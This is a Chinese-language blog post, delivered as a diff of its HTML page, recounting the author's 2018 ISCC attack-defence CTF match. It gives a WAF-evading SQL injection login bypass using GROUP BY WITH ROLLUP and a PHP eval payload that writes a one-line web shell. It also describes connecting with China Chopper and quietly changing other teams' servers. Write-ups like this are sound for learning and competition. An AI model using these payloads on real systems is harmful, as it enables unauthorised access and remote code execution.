@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="http://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="2018-iscc线下"/>
+  <meta name="twitter:description" content="前
+
+真正意义上第一次打线下ad,比赛结束还是挺遗憾的,比赛过程中很多失误的地方.不然名次会更好一些..不过还是收获了很多.记录一下,继续成长吧.
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>2018-iscc线下 &middot; Yang1k</title>
+		<link rel="shortcut icon" href="http://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="http://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="http://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='http://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='http://yang1k.github.io/post'>Archive</a>
+	<a href='http://yang1k.github.io/tags'>Tags</a>
+	<a href='http://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="http://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        2018-iscc线下
+                    </h1>
+                    <h2 class="headline">
+                    Jul 17, 2018 09:54
+                    · 213 words
+                    · 1 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="http://yang1k.github.io/tags/ctf">ctf</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#前">前</a></li>
+<li><a href="#早上">早上</a></li>
+<li><a href="#ad">AD</a></li>
+<li><a href="#后记">后记</a></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <h2 id="前">前</h2>
+
+<p>真正意义上第一次打线下ad,比赛结束还是挺遗憾的,比赛过程中很多失误的地方.不然名次会更好一些..不过还是收获了很多.记录一下,继续成长吧.
+<!-- more --></p>
+
+<h2 id="早上">早上</h2>
+
+<p>早上是选择题和3道ctf题,就不多说了.</p>
+
+<h2 id="ad">AD</h2>
+
+<p>中午12点开放ad环境,iscc的赛制是自己队伍的私地也需要自己搞定.访问自己的IP后,是一个登录框.</p>
+
+<p>尝试万能密码登录,结果出现一个表清包,抓包分析,在响应头看到hint:hint.txt,访问得到了部分源码</p>
+
+<pre><code>&lt;?php
+$sql=&quot;SELECT pwd FROM user WHERE uname = '{$_POST['uname']}'&quot;;
+$query = mysqli_query($con,$sql); 
+if (mysqli_num_rows($query) == 1) { 
+    $key = mysqli_fetch_array($query);
+    if($key['pwd'] == $_POST['pwd']) {
+        echo &quot;xxxxxxxxx&quot;;
+    }else{
+        echo &quot;你这密码不太对啊&quot;;
+    }
+}else if(mysqli_num_rows($query) == 0){
+	echo &quot;你这密码不太对啊&quot;;
+}
+else{
+	echo &quot;数据太多了&quot;;
+}
+
+</code></pre>
+
+<p>似曾相熟的源码,和实验吧的一道题很相似,是利用group by&hellip;with rollup来绕过</p>
+
+<p>group by&hellip;with rollup:</p>
+
+<pre><code>mysql&gt; select * from user;
++------+-------+------+
+| id   | uname | pwd  |
++------+-------+------+
+|    1 | admin | 12   |
++------+-------+------+
+1 row in set (0.00 sec)
+
+mysql&gt; select * from user group by pwd with rollup;
++------+-------+------+
+| id   | uname | pwd  |
++------+-------+------+
+|    1 | admin | 12   |
+|    1 | admin | NULL |
++------+-------+------+
+2 rows in set (0.00 sec)
+
+</code></pre>
+
+<p>由上的结果可以发现,我们可以将查询的pwd填充为空,那么我们构造这样的uname</p>
+
+<pre><code>uname : 1' or 1=1 group by pwd with rollup limit 1,1#
+</code></pre>
+
+<p>最终的sql语句就会变成这样</p>
+
+<pre><code>SELECT pwd FROM user WHERE uname = '1' or 1=1 group by pwd with rollup limit 1,1#'
+
+</code></pre>
+
+<p>取出的pwd就为<code>NULL</code>,这时我们的密码留空即可.</p>
+
+<p>在本地测试可以登录,实际测试时还是出现表情包,可能是有waf.</p>
+
+<p>测试发现waf将<code>or and union sleep &amp;&amp; || ,</code>都过滤掉了.</p>
+
+<p><code>,</code>可以用offset来代替,or 可以使用 <code>'=0</code>来代替,最终的uname如下</p>
+
+<pre><code>
+uname: '=0 group by pwd with rollup limit 1 offset 1#
+密码留空
+</code></pre>
+
+<p>登录后给出一串字符</p>
+
+<pre><code>+ADg-d+ADIAMA-d+ADUANw-e+ADI-f+ADIAYgA5AGI-e+ADUALw-f+AGIAMwAw-e+ADcAMA-f+ADcAOAAxADMANAA4ADk-dd+AGE-e+ADcAOQBi-e+ADAANwA5ADIANQBhADMANABhAC4AcABoAHA-
+
+</code></pre>
+
+<p>刚开始以为是xxencode编码,真的很像,但是解码的时候失败了,最后发现是utf-7编码&hellip;在这里卡了挺久的&hellip;最终解码后是一个路径</p>
+
+<pre><code>8d20d57e2f2b9be5/fb30e70f7813489ddae79be07925a34a.php
+</code></pre>
+
+<p>访问得</p>
+
+<pre><code>&lt;?php
+show_source( __FILE__); 
+$a = @$_REQUEST['a'];
+@eval(&quot;var_dump($$a);&quot;); 
+
+</code></pre>
+
+<p>一个很简单的任意代码执行,构造paylaod如下</p>
+
+<pre><code>http://192.168.36.147/8d20d57e2f2b9be5/fb30e70f7813489ddae79be07925a34a.php?a=a);fwrite(fopen(&quot;aa.php&quot;, &quot;w&quot;),&quot;&lt;?php @eval(\$_POST['cms']); ?&gt;&quot;);phpinfo(
+
+</code></pre>
+
+<p>写入shell,菜刀连接即可.连接后赶紧补了自己的洞,这个时候都3点了,已经被打几轮了.(主要编码那个浪费很多时间,心塞)</p>
+
+<p>然后我尝试访问其他选手的私地IP发现连不上去,以为要做端口转发,把ew用菜刀传上去,结果不能执行?????然后又卡住了,一直在找别的办法打别人的私地.</p>
+
+<pre><code>1. 尝试端口转发,但是ew始终无法执行
+2. 在菜刀的终端里,尝试直接用curl访问别的队伍,确实可以访问,但是可能是因为payload里有特殊字符,导致无法传参过去??又卡住了..
+
+</code></pre>
+
+<p>就这样折腾到了5点,还是没有打到别人,这时候对面选手的网络出现了问题,主办方有人过来修理,我想是不是我的网络也出现问题,于是问对面选手,才知道,拿下私地后,要联系主办方,主办方会给服务器的账号密码,并且开放访问别的队伍的权限(&hellip;&hellip;) 联系主办方后,迅速筛选还没有修补漏洞的选手的IP然后使用<code>hereiam -t 队伍签名</code>命令拿分.</p>
+
+<p>我用菜刀连上别的队伍的私地后,发现并没有队伍修改别人私地漏洞的参数,就是<code>$a = @$_REQUEST['a'];</code>中的a,(大佬们都好善良),</p>
+
+<p>于是我就悄悄的把所用能打的队伍的参数全部替换成<code>yang</code>了,然后把<code>show_source</code>注释掉了,帮他们修补漏洞.嘻嘻嘻.</p>
+
+<p>下一轮开始的时候,听到有人说 怎么payload打不到了,页面也变空白了.哈哈哈哈.</p>
+
+<p>但是由于之前没有搞清楚赛制,浪费了很多时间,错过了好几轮.(心塞)</p>
+
+<h2 id="后记">后记</h2>
+
+<p>下次比赛一定要先熟悉赛制,吃过的亏不能吃第二遍了.</p>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=http%3a%2f%2fyang1k.github.io%2fpost%2f2018-iscc%25E7%25BA%25BF%25E4%25B8%258B%2f - 2018-iscc%e7%ba%bf%e4%b8%8b "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2019 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="http://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="http://yang1k.github.io/js/main.js"></script>
+<script src="http://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
